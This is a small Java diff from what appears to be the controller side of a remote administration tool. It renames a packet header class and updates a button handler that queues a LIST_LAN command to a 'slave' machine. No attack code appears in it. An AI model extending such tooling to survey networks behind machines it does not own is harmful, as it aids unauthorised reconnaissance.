@@ -17,7 +17,7 @@ import javax.swing.ScrollPaneConstants;
 import javax.swing.table.DefaultTableModel;
 
 import com.redpois0n.Slave;
-import com.redpois0n.packets.outgoing.Header;
+import com.redpois0n.packets.OutgoingHeader;
 
 @SuppressWarnings("serial")
 public class PanelControlLANComputers extends PanelControlParent {
@@ -65,7 +65,7 @@ public class PanelControlLANComputers extends PanelControlParent {
 			public void actionPerformed(ActionEvent e) {
 				clear();
 				starting();
-				slave.addToSendQueue(Header.LIST_LAN);
+				slave.addToSendQueue(OutgoingHeader.LIST_LAN);
 			}
 		});
 		btnReloadList.setIcon(new ImageIcon(PanelControlLANComputers.class.getResource("/icons/update.png")));
